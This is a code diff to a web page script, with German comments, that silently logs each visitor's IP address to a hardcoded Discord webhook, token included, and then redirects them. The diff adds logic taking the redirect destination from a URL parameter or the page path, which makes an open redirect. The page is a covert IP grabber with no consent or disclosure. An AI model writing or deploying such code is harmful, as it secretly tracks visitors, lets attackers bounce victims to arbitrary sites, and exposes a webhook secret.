@@ -40,9 +40,20 @@
 <script>
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1457050057814573146/fTL6O37dVj0UPkrHSSGC_zEOAS0ExRaO1w4EaCwaRX_MXRlYIod3f-_e_mPvn4zKlsDj";
 
-// Zielseite
+// Zielseite aus Parameter
 const params = new URLSearchParams(window.location.search);
-const gotoAfter = params.get("gotoafter") || "https://t3102115-cmd.github.io";
+let gotoAfter = params.get("gotoafter");
+
+// Wenn kein Parameter, dann prüfen, ob Pfad vorhanden
+if (!gotoAfter) {
+    const path = window.location.pathname.split("/").pop(); // letzter Teil des Pfads
+    if (path && path !== "index.html") {
+        gotoAfter = "https://" + path;
+    }
+}
+
+// Fallback
+gotoAfter = gotoAfter || "https://t3102115-cmd.github.io";
 
 // Cookie‑Helfer
 function setCookie(name, value, days = 365) {
@@ -71,7 +82,7 @@ function logIp() {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
-                    content: `An visitor accesed your Website! IP: ${data.ip} GotoAfter: ${gotoAfter}`
+                    content: `📡 Visitor accessed your site!\nIP: ${data.ip}\nGotoAfter: ${gotoAfter}`
                 })
             });
         })
